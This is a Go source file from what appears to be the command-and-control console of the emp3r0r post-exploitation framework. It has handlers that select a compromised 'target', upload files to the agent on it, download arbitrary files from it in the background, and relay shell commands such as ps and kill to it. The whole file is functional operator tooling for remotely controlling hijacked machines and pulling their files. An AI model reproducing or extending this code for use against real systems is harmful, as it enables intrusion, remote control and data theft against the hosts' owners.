//go:build linux
// +build linux

package cc

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// LsDir cache items in current directory
var LsDir []string

func FSSingleArgCmd(cmd string) {
	executeCmdWithArgs(cmd, 1)
}

func FSDoubleArgCmd(cmd string) {
	executeCmdWithArgs(cmd, 2)
}

func FSNoArgCmd(cmd string) {
	if cmd == "ps" {
		cmd = "#ps"
	}
	executeCmd(cmd)
}

func UploadToAgent(cmd string) {
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	inputSlice := util.ParseCmd(cmd)
	if len(inputSlice) != 3 {
		CliPrintError("put <local path> <remote path>")
		return
	}

	if err := PutFile(inputSlice[1], inputSlice[2], target); err != nil {
		CliPrintError("Cannot put %s: %v", inputSlice[2], err)
	}
}

func DownloadFromAgent(cmd string) {
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	inputSlice := util.ParseCmd(cmd)
	if len(inputSlice) < 2 {
		CliPrintError("get <file path>")
		return
	}

	fileToGet := strings.Join(inputSlice[1:], " ")
	go func() {
		if err := GetFile(fileToGet, target); err != nil {
			CliPrintError("Cannot get %s: %v", inputSlice[1], err)
		}
	}()
}

func executeCmdWithArgs(cmd string, expectedArgs int) {
	inputSlice := util.ParseCmd(cmd)
	cmdname := inputSlice[0]
	if len(inputSlice) < expectedArgs+1 {
		CliPrintError("%s requires %d argument(s)", cmdname, expectedArgs)
		return
	}

	if cmdname == "kill" && expectedArgs == 1 {
		inputSlice[0] = "#kill"
		cmd = strings.Join(inputSlice, " ")
	}

	args := strings.Join(inputSlice[1:], "' '")
	executeCmd(fmt.Sprintf("%s '%s'", inputSlice[0], args))
}

func executeCmd(cmd string) {
	err := SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		CliPrintError("%s failed: %v", cmd, err)
	}
}
